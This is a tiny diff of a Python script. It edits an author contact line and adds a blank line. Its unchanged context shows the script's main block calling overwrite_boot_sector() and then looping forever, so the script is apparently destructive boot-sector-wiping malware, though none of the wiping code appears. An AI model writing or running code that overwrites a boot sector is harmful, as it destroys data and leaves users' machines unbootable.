@@ -1,5 +1,5 @@
 # Author: Ryōka
-# Contact: ryukakoi 
+# Contact: @ryukakoi 
 
 
 
@@ -111,5 +111,6 @@ if __name__ == "__main__":
     overwrite_boot_sector()
     while True:
         time.sleep(1)
+
 
 
